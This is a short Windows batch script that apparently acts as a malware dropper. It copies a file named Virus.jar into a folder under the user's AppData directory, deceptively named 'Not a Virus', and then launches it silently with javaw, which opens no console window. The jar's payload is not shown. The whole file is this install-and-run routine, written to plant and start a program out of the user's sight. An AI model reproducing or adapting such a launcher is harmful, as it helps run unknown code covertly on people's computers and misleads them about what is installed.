@echo off
cd C:
mkdir "%APPDATA%\Not a Virus"
copy "%CD%\Virus\dist\Virus.jar" "%APPDATA%\Not a Virus\Virus.jar"
start javaw -jar "%APPDATA%\Not a Virus\Virus.jar"